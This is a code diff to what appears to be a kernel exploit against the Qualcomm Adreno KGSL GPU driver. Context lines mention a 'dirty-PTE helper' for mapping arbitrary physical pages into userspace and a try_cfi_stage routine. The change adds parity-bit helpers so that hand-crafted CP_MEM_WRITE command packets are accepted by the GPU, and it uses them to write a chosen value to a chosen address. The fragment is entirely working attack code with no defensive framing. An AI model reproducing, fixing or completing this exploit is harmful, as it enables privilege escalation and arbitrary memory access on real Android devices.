@@ -36,6 +36,16 @@ struct kgsl_ringbuffer_issueibcmds {
 struct kgsl_device_waittimestamp { unsigned int timestamp; unsigned int timeout; };
 #define IOCTL_KGSL_DEVICE_WAITTIMESTAMP_ _IOW(0x09, 0x6, struct kgsl_device_waittimestamp)
 #define CP_MEM_WRITE 0x3du
+/* cp_type7_packet() embeds odd-parity bits for the count (bit 15) and the opcode
+ * (bit 23); a hand-built header must include them or the CP ignores the packet. */
+static uint32_t cp_parity(uint32_t v) {
+  v ^= v >> 16; v ^= v >> 8; v ^= v >> 4; v ^= v >> 2; v ^= v >> 1;
+  return v & 1u;
+}
+static uint32_t cp_type7_packet(uint32_t op, uint32_t cnt) {
+  return (7u << 28) | (cnt & 0x3fffu) | (cp_parity(cnt) << 15) |
+         ((op & 0x7fu) << 16) | (cp_parity(op) << 23);
+}
 
 /* --- dirty-PTE helper: map an arbitrary physical page into userspace --------
  * arm64 (VA_BITS=39, 4K granule) = 3 levels: pgd[38:30] pmd[29:21] pte[20:12].
@@ -1467,7 +1477,7 @@ int try_cfi_stage(void) {
                          * into this very IB page, which we can read from the CPU. */
                         uint64_t writetgt = self ? (uint64_t)(m2.gpuaddr + 0x20)
                                                  : (uint64_t)m.gpuaddr;
-                        ib[0] = (7u << 28) | (CP_MEM_WRITE << 16) | 3u;
+                        ib[0] = cp_type7_packet(CP_MEM_WRITE, 3);
                         ib[1] = (uint32_t)writetgt;
                         ib[2] = (uint32_t)(writetgt >> 32);
                         ib[3] = val;
